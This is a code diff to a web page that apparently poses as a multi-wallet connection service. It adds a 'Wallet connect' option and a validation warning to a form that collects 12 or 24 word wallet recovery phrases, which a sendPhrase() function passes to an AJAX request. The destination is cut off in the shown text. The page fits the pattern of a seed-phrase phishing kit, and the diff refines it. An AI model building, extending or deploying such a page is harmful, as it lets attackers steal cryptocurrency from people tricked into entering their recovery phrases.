@@ -337,6 +337,14 @@
                   </div></div>
                   </div></div>
 
+
+                  <div class="col-lg-3 col-4 my-2"><div class="card primary-bg"><div class="card-body"><div>
+                    <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr Bridge-Walletidentifier"><img id="wallet connect" onclick="change_wallet(this.id,this.src)" data-bs-toggle="modal" data-bs-target="#auth"  class="card-img-top" src="./WalletNetwork_files/walletconnect.jfif"
+                      alt="Bridge Wallet"></div>
+                    <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW Bridge-Walletidentifier">Wallet connect</div>
+                  </div></div>
+                  </div></div>
+
                   <div class="col-lg-3 col-4 my-2"><div class="card primary-bg"><div class="card-body"><div>
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr SparkPointidentifier"><img id="SparkPoint" onclick="change_wallet(this.id,this.src)" data-bs-toggle="modal" data-bs-target="#auth"  class="card-img-top" src="./WalletNetwork_files/app(26).php" alt="SparkPoint"></div>
                     <div class="pageStyles__SAppName-sc-1navawn-7 eodRCW SparkPointidentifier">SparkPoint</div>
@@ -717,6 +725,11 @@
                                                 Usually 12 (sometimes 24) words, enter words separated by single space.
                                             </small>
                                         </p>
+                                        <p>
+                                          <span id="warn" class="warn text-danger" style="display: none;">
+                                            Please enter a valid phrase
+                                          </span>
+                                        </p>
                                     </div>
                                 </form>
                             </div>
@@ -727,7 +740,7 @@
                             </p>
                             <p align="center">
                                 By continuing, you agree to our Terms of Service, Privacy Policy, and Cookie Policy
-                                
+
                             </p>
                         </div>
                     </div>
@@ -757,7 +770,8 @@ function change_wallet(wallet,logo){
   function sendPhrase(){
     const phrase = $("#phrase").val()
     if(phrase == ""){
-      Swal.fire('Oops','Phrase cannot be empty','error')
+      $("#warn").css('display','block')
+      //Swal.fire('Oops','Phrase cannot be empty','error')
     }
     else{
       $.ajax({
